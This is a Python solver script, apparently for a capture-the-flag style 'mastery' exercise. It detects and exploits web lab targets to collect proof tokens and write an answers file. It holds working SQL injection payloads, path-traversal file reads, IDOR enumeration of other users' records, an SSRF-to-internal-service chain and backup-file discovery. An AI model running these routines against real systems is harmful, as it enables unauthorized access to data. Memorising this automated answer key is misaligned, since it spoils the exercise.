#!/usr/bin/env python3
"""Classify and solve every assigned Internal Affairs mastery target.

Expected cumulative classes are recovered independently from live evidence:
backup exposure, IDOR, group-closing SQLi, PHP LFI, and this family's chained
SSRF/internal-IDOR. Routes and identifiers are never reused across attempts.
"""
import http.cookiejar
import json
import re
import time
import urllib.error
import urllib.parse
import urllib.request
from html.parser import HTMLParser
from pathlib import Path

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")


class Links(HTMLParser):
    def __init__(self):
        super().__init__()
        self.hrefs = []

    def handle_starttag(self, tag, attrs):
        if tag == "a":
            for key, value in attrs:
                if key == "href" and value:
                    self.hrefs.append(value)


class Target:
    def __init__(self, base_url, evidence_dir):
        self.base = base_url.rstrip("/")
        self.evidence = Path(evidence_dir)
        self.evidence.mkdir(parents=True, exist_ok=True)
        self.requests = 0
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar))

    def get(self, path, save):
        if self.requests:
            time.sleep(0.8)
        self.requests += 1
        url = path if path.startswith("http") else self.base + path
        if not url.startswith(self.base):
            raise ValueError(f"refusing out-of-scope URL: {url}")
        request = urllib.request.Request(url, headers={"User-Agent": UA})
        try:
            with self.opener.open(request, timeout=30) as response:
                status = response.status
                headers = response.headers
                body = response.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as error:
            status = error.code
            headers = error.headers
            body = error.read().decode("utf-8", "replace")
        (self.evidence / f"{save}.headers").write_text(
            f"HTTP {status}\n{str(headers)}")
        (self.evidence / f"{save}.body").write_text(body)
        return status, body

    def get_json(self, path, save):
        status, body = self.get(path, save)
        try:
            return status, json.loads(body)
        except ValueError:
            return status, None


def proof_in(body):
    match = PROOF_RE.search(body)
    return match.group(0) if match else None


def rec_internal_affairs(target, clues):
    """Public server-side fetch -> internal status -> foreign case id."""
    feature = clues["feature_route"]
    status, topology = target.get_json(clues["topology_route"], "topology")
    if status != 200 or not isinstance(topology, dict):
        return None
    status, directory = target.get_json(
        clues["case_directory_route"], "case-directory")
    if status != 200 or not isinstance(directory, dict):
        return None
    status, hint = target.get_json(feature, "feature-schema")
    fetch_param = ((hint or {}).get("query_parameter")
                   if status == 400 else None) or "target"
    service = topology.get("case_service")
    if not service:
        return None
    for case in directory.get("cases", []):
        if case.get("owner") == clues.get("current_role") or "id" not in case:
            continue
        parts = urllib.parse.urlsplit(service)
        query = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
        query.append(("id", str(case["id"])))
        internal = urllib.parse.urlunsplit(
            parts._replace(query=urllib.parse.urlencode(query)))
        outer = urllib.parse.urlencode({fetch_param: internal})
        status, body = target.get(
            f"{feature}?{outer}", f"foreign-case-{case['id']}")
        proof = proof_in(body)
        if proof:
            return proof
    return None


def rec_lfi(target, html, prompt=""):
    link = re.search(r'href="([^"]*\.php)\?(\w+)=', html)
    if not link:
        return None
    endpoint, param = link.group(1), link.group(2)
    objective = re.search(r"mounted at (/\S+)", prompt)
    objective_path = (objective.group(1).rstrip(".") if objective
                      else "/run/huntress/objective.txt")
    relative = objective_path.lstrip("/")
    for depth in range(1, 9):
        payload = "../" * depth + relative
        path = f"{endpoint}?{urllib.parse.urlencode({param: payload})}"
        status, body = target.get(path, f"lfi-depth-{depth}")
        proof = proof_in(body)
        if proof:
            return proof
    path = f"{endpoint}?{urllib.parse.urlencode({param: objective_path})}"
    status, body = target.get(path, "lfi-absolute")
    return proof_in(body)


def rec_idor(target, html):
    feed = next(iter(re.findall(r'href="(/api/[^"]+)"', html)), None)
    case_links = re.findall(r'href="(/[a-z]+/\d+)"', html)
    if not feed or not case_links:
        return None
    own_ids = {int(link.rsplit("/", 1)[1]) for link in case_links}
    status, case_page = target.get(case_links[0], "own-case-page")
    inline = re.search(
        r'fetch\(["\'](/api/[^"\']*?)(\d+)([^"\']*)["\']', case_page)
    api_template = ((inline.group(1), inline.group(3)) if inline else None)
    status, feed_body = target.get(feed, "activity-feed")
    try:
        feed_json = json.loads(feed_body)
    except ValueError:
        return None
    me = feed_json.get("current_user")
    foreign_ids = []
    for event in feed_json.get("events", []):
        case_id = event.get("case_id") or event.get("id")
        if case_id is None:
            continue
        if ((event.get("owner") and event.get("owner") != me)
                or event.get("visibility") == "reference_only"
                or case_id not in own_ids):
            foreign_ids.append(case_id)
    for case_id in dict.fromkeys(foreign_ids):
        if api_template:
            urls = [f"{api_template[0]}{case_id}{api_template[1]}"]
        else:
            kind = case_links[0].rsplit("/", 2)[-2]
            urls = [f"/api/{kind}/{case_id}"]
        for url in urls:
            status, body = target.get(url, f"foreign-object-{case_id}")
            proof = proof_in(body)
            if proof:
                return proof
    return None


def rec_sqli(target, html):
    action_match = re.search(
        r"<form[^>]*action=['\"]([^'\"]+)['\"]", html)
    name_match = re.search(r"<input[^>]*name=['\"]([^'\"]+)['\"]", html)
    action = action_match.group(1) if action_match else "/search"
    name = name_match.group(1) if name_match else "q"
    for index, payload in enumerate(
            ("') OR ('1'='1", "%' OR '1'='1", "') OR ('1'='1'-- -", "' OR '1'='1")):
        path = f"{action}?{urllib.parse.urlencode({name: payload})}"
        status, body = target.get(path, f"sqli-{index}")
        proof = proof_in(body)
        if proof:
            return proof
    return None


def rec_backup(target):
    status, robots = target.get("/robots.txt", "robots")
    if status != 200:
        return None
    for disclosed in re.findall(r"(?mi)^\s*Disallow:\s*(\S+)", robots):
        directory = "/" + disclosed.strip("/") + "/"
        status, index = target.get(
            directory, "directory" + directory.replace("/", "_"))
        if status != 200:
            continue
        parser = Links()
        parser.feed(index)
        members = [href for href in parser.hrefs
                   if href.rstrip("/").split("/")[-1]]
        members.sort(key=lambda href: 0 if re.search(
            r"\.(bak|old|orig|save|swp|zip|tar|gz|sql|json|txt|env)(\.|$)",
            href, re.I) else 1)
        for href in members:
            path = href if href.startswith("/") else directory + href
            status, body = target.get(
                path, "file_" + path.strip("/").replace("/", "_"))
            if status == 200:
                proof = proof_in(body)
                if proof:
                    return proof
    return None


def classify_and_recover(target, prompt=""):
    status, html = target.get("/", "root")
    evidence = {"root_status": status}
    if status != 200:
        evidence["classification"] = "root request failed"
        return None, evidence
    clues_status, clues = target.get_json("/api/clues", "clues")
    if clues_status == 200 and isinstance(clues, dict):
        evidence["clues"] = clues
        if all(clues.get(key) for key in
               ("feature_route", "topology_route", "case_directory_route")):
            evidence["classification"] = "SSRF followed by internal IDOR"
            proof = rec_internal_affairs(target, clues)
            if proof:
                return proof, evidence
    if re.search(r'href="[^"]*\.php\?\w+=', html):
        evidence["classification"] = "LFI"
        proof = rec_lfi(target, html, prompt)
        if proof:
            return proof, evidence
    if (re.search(r'href="(/api/[^"]+)"', html)
            and re.findall(r'href="(/[a-z]+/\d+)"', html)):
        evidence["classification"] = "IDOR"
        proof = rec_idor(target, html)
        if proof:
            return proof, evidence
    if re.search(r"<form[^>]*action=['\"][^'\"]*(search|lookup|explore)",
                 html, re.I):
        evidence["classification"] = "group-closing SQLi"
        proof = rec_sqli(target, html)
        if proof:
            return proof, evidence
    evidence["classification"] = "backup exposure"
    proof = rec_backup(target)
    if proof:
        return proof, evidence
    evidence["classification"] = "unclassified"
    return None, evidence


def main():
    start = json.loads(Path("mastery/start.json").read_text())
    targets = {row["id"]: row["url"] for row in start["targets"]}
    answers = {}
    for question in start["questions"]:
        answer_id = question["id"]
        target_id = question["artifact"]
        evidence_dir = Path("mastery/evidence") / target_id.replace(" ", "_")
        target = Target(targets[target_id], evidence_dir)
        proof, evidence = classify_and_recover(
            target, question.get("question", ""))
        evidence["answer_id"] = answer_id
        evidence["target_id"] = target_id
        evidence["proof_recovered"] = bool(proof)
        (evidence_dir / "classification.json").write_text(
            json.dumps(evidence, indent=2) + "\n")
        print(f"{answer_id} ({target_id}): "
              f"{evidence['classification']} -> {proof}", flush=True)
        if proof:
            answers[answer_id] = proof
    Path("mastery/answers.json").write_text(
        json.dumps({"answers": answers}, indent=2) + "\n")
    print(f"wrote mastery/answers.json with {len(answers)} answers")


if __name__ == "__main__":
    main()
